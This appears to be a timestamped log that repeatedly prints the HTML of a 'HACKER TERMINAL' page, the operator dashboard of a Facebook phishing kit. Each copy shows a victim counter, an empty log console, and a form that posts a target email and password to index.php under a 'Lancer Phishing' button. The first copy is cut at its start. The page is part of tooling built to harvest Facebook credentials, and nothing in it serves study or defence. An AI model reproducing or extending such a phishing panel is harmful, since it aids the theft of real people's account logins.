+06:35:55 -         .time{color:#ff6600;}
+06:35:55 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
+06:35:55 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
+06:35:55 -         .btn:hover{background:#0a0;}
+06:35:55 -         .btn-red{background:#f00;color:#fff;}
+06:35:55 -     </style>
+06:35:55 - </head>
+06:35:55 - <body>
+06:35:55 -     <div class="header">
+06:35:55 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
+06:35:55 -     </div>
+06:35:55 -     <div class="console" id="console">
+06:35:55 -             </div>
+06:35:55 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
+06:35:55 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
+06:35:55 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
+06:35:55 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
+06:35:55 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
+06:35:55 -     </form>
+06:35:55 -     <script>
+06:35:55 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
+06:35:55 -     </script>
+06:35:55 - </body>
+06:35:55 - </html>
+06:35:56 - <!DOCTYPE html>
+06:35:56 - <html>
+06:35:56 - <head>
+06:35:56 -     <title>🔥 HACKER TERMINAL v2.0</title>
+06:35:56 -     <meta http-equiv="refresh" content="5">
+06:35:56 -     <style>
+06:35:56 -         *{margin:0;padding:0;box-sizing:border-box;}
+06:35:56 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
+06:35:56 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
+06:35:56 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
+06:35:56 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
+06:35:56 -         .email{color:#ff0;font-weight:bold;}
+06:35:56 -         .ip{color:#0ff;}
+06:35:56 -         .time{color:#ff6600;}
+06:35:56 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
+06:35:56 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
+06:35:56 -         .btn:hover{background:#0a0;}
+06:35:56 -         .btn-red{background:#f00;color:#fff;}
+06:35:56 -     </style>
+06:35:56 - </head>
+06:35:56 - <body>
+06:35:56 -     <div class="header">
+06:35:56 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
+06:35:56 -     </div>
+06:35:56 -     <div class="console" id="console">
+06:35:56 -             </div>
+06:35:56 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
+06:35:56 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
+06:35:56 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
+06:35:56 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
+06:35:56 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
+06:35:56 -     </form>
+06:35:56 -     <script>
+06:35:56 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
+06:35:56 -     </script>
+06:35:56 - </body>
+06:35:56 - </html>
+06:35:57 - <!DOCTYPE html>
+06:35:57 - <html>
+06:35:57 - <head>
+06:35:57 -     <title>🔥 HACKER TERMINAL v2.0</title>
+06:35:57 -     <meta http-equiv="refresh" content="5">
+06:35:57 -     <style>
+06:35:57 -         *{margin:0;padding:0;box-sizing:border-box;}
+06:35:57 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
+06:35:57 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
+06:35:57 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
+06:35:57 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
+06:35:57 -         .email{color:#ff0;font-weight:bold;}
+06:35:57 -         .ip{color:#0ff;}
+06:35:57 -         .time{color:#ff6600;}
+06:35:57 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
+06:35:57 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
+06:35:57 -         .btn:hover{background:#0a0;}
+06:35:57 -         .btn-red{background:#f00;color:#fff;}
+06:35:57 -     </style>
+06:35:57 - </head>
+06:35:57 - <body>
+06:35:57 -     <div class="header">
+06:35:57 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
+06:35:57 -     </div>
+06:35:57 -     <div class="console" id="console">
+06:35:57 -             </div>
+06:35:57 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
+06:35:57 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
+06:35:57 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
+06:35:57 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
+06:35:57 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
+06:35:57 -     </form>
+06:35:57 -     <script>
+06:35:57 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
+06:35:57 -     </script>
+06:35:57 - </body>
+06:35:57 - </html>
+06:35:58 - <!DOCTYPE html>
+06:35:58 - <html>
+06:35:58 - <head>
+06:35:58 -     <title>🔥 HACKER TERMINAL v2.0</title>
+06:35:58 -     <meta http-equiv="refresh" content="5">
+06:35:58 -     <style>
+06:35:58 -         *{margin:0;padding:0;box-sizing:border-box;}
+06:35:58 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
+06:35:58 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
+06:35:58 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
+06:35:58 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
+06:35:58 -         .email{color:#ff0;font-weight:bold;}
+06:35:58 -         .ip{color:#0ff;}
+06:35:58 -         .time{color:#ff6600;}
+06:35:58 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
+06:35:58 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
+06:35:58 -         .btn:hover{background:#0a0;}
+06:35:58 -         .btn-red{background:#f00;color:#fff;}
+06:35:58 -     </style>
+06:35:58 - </head>
+06:35:58 - <body>
+06:35:58 -     <div class="header">
+06:35:58 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
+06:35:58 -     </div>
+06:35:58 -     <div class="console" id="console">
+06:35:58 -             </div>
+06:35:58 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
+06:35:58 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
+06:35:58 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
+06:35:58 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
+06:35:58 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
+06:35:58 -     </form>
+06:35:58 -     <script>
+06:35:58 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
+06:35:58 -     </script>
+06:35:58 - </body>
+06:35:58 - </html>
